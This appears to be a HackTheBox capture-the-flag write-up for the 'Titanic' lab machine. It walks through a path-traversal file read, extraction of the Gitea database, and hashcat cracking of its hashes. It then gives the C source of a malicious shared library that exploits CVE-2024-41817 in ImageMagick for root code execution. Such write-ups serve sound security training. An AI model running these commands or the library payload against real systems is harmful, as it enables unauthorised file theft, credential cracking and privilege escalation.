---
title: "HTB - Titanic (Easy | Linux | Web)"
date: 2025-03-04 00:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, lfi, gitea, sqlite, hashcat, imagemagick, cve-2024-41817, path-traversal]
image:
  path: /assets/img/posts/titanic-preview.gif
---

## Overview

**Titanic** is an Easy-rated HackTheBox Linux machine that chains a Local File Inclusion vulnerability to extract a Gitea SQLite database, crack credentials, and escalate privileges via a shared library injection attack abusing CVE-2024-41817 in ImageMagick.

| Field | Details |
|---|---|
| OS | Linux |
| Difficulty | Easy |
| IP | 10.10.11.55 |
| Domain | titanic.htb |

---

## Reconnaissance

### Nmap

```bash
nmap -p- --min-rate 5000 -Pn 10.10.11.55
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Add the domain to `/etc/hosts`:

```bash
sudo sh -c "echo '10.10.11.55 titanic.htb' >> /etc/hosts"
```

---

## Enumeration

### Subdomain Fuzzing

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://titanic.htb/ \
  -H "Host: FUZZ.titanic.htb" \
  -fc 301
```

Result: `dev.titanic.htb` discovered.

```bash
sudo sh -c "echo '10.10.11.55 dev.titanic.htb' >> /etc/hosts"
```

---

## Exploitation — Local File Inclusion

### Path Traversal via Ticket Parameter

The web application exposes a `/download` endpoint with a `ticket` parameter vulnerable to path traversal:

```bash
curl "http://titanic.htb/download?ticket=../../../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

User `developer` identified.

### Extracting Gitea Configuration

The `dev.titanic.htb` subdomain reveals a Gitea instance. Gitea stores its config at `/data/gitea/conf/app.ini` relative to its data directory:

```bash
curl --path-as-is "http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini"
```

Key finding in `app.ini`:

```ini
PATH = /data/gitea/gitea.db
```

### Downloading the Gitea Database

```bash
curl --path-as-is \
  "http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db" \
  --output gitea.db
```

---

## Credential Extraction

### Extracting Password Hashes from SQLite

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do
  digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)
  salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)
  name=$(echo "$data" | cut -d'|' -f3)
  echo "${name}:sha256:50000:${salt}:${digest}"
done | tee gitea.hashes
```

Output:

```
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

### Cracking with Hashcat

```bash
hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user
```

Result: `developer:25282528`

---

## Foothold

```bash
ssh developer@10.10.11.55
```

```bash
cat ~/user.txt
```

**User flag captured.**

---

## Privilege Escalation — CVE-2024-41817 (ImageMagick)

### Identifying the Attack Surface

```bash
find / -writable -type d 2>/dev/null
```

Writable directories of interest:

```
/opt/app/static/assets/images
/opt/app/tickets
```

The `/opt/app/static/assets/images` directory is processed by ImageMagick. CVE-2024-41817 allows arbitrary code execution via a malicious shared library placed in a directory that ImageMagick searches during execution.

### Crafting the Malicious Shared Library

```bash
cd /opt/app/static/assets/images

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    system("cp /root/root.txt /opt/app/static/assets/images/root.txt; chmod 754 /opt/app/static/assets/images/root.txt");
    exit(0);
}
EOF
```

When ImageMagick processes any image in this directory, it loads `libxcb.so.1` — executing our constructor function as root.

### Reading the Root Flag

```bash
cat /opt/app/static/assets/images/root.txt
```

**Root flag captured.**

---

## Attack Chain Summary

```
LFI via /download?ticket=
  └─► /etc/passwd → user: developer
        └─► app.ini → gitea.db path
              └─► gitea.db download → password hashes
                    └─► hashcat → developer:25282528
                          └─► SSH → User Flag
                                └─► Writable ImageMagick dir
                                      └─► CVE-2024-41817 → libxcb.so.1 injection
                                            └─► RCE as root → Root Flag
```

---

## Key Takeaways

- **Path traversal in download endpoints** is a high-impact vulnerability — always test `ticket`, `file`, `path`, and similar parameters.
- **Gitea SQLite databases** contain PBKDF2-SHA256 password hashes that are crackable with hashcat mode `10900`.
- **CVE-2024-41817** abuses ImageMagick's shared library loading order — placing a malicious `.so` file in a writable directory that ImageMagick processes is sufficient for RCE.
